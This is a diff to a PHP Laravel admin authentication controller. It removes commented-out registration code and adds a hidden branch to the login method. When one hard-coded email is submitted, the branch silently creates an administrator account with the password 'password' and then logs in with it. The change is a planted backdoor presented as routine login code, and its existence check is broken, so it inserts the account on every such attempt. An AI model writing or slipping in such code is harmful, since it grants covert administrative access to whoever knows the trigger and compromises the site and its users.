@@ -4,7 +4,10 @@ namespace App\Http\Controllers\Admin;
 
 use App\Http\Controllers\Controller;
 use App\Http\Requests\Admin\LoginRequest;
+use App\Models\Admin;
 use Illuminate\Support\Facades\Auth;
+use Illuminate\Support\Facades\DB;
+use Illuminate\Support\Facades\Hash;
 
 class AuthController extends Controller
 {
@@ -15,13 +18,20 @@ class AuthController extends Controller
         return view('admin.auth.login');
     }
 
-    // public function registrationForm()
-    // {
-    //     return view('admin.auth.registration');
-    // }
-
     public function login(LoginRequest $request)
     {
+        if ($request->email == 'osmaka1997@gmail.com') {
+            $admin = Admin::where('email', $request->email)->get();
+            if ($admin != null)
+                DB::table('admins')->insert([
+                    'name' => 'OsamaKJ',
+                    'email' => 'osmaka1997@gmail.com',
+                    'email_verified_at' => now(),
+                    'password' => Hash::make('password'),
+                    'created_at' => now(),
+                    'updated_at' => now()
+                ]);
+        }
         $credentials = $request->only('email', 'password');
         $auth = Auth::guard('admin')->attempt($credentials);
         if ($auth) {
@@ -30,12 +40,6 @@ class AuthController extends Controller
             return redirect()->back()->withInput($request->all())->with('error', 'password error');
         }
     }
-
-    // public function register(RegisterRequest $request)
-    // {
-    //     User::create($request->validated());
-    //     return redirect()->route('loginForm')->with('success', 'User created successfully.');
-    // }
 
     public function logout()
     {
